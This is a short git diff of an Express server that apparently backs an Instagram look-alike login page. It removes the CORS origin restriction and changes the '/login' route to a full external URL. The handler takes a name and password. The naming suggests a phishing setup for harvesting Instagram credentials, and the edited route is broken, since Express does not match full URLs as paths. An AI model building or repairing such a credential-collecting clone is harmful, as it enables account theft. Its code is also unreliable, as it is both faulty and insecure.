@@ -8,7 +8,6 @@ const app = express();
 
 // ✅ CORS config
 const corsOptions = {
-  origin: 'https://instagram-login-silk.vercel.app', // frontend URL
   methods: ['GET', 'POST'],
   credentials: true,
   allowedHeaders: ['Content-Type']
@@ -32,7 +31,7 @@ app.get('/', (req, res) => {
 });
 
 // ✅ Login logic
-app.post('/login', async (req, res) => {
+app.post('https://insta-backend-4-yadw.onrender.com/login', async (req, res) => {
   const { name, password } = req.body;
 
   try {
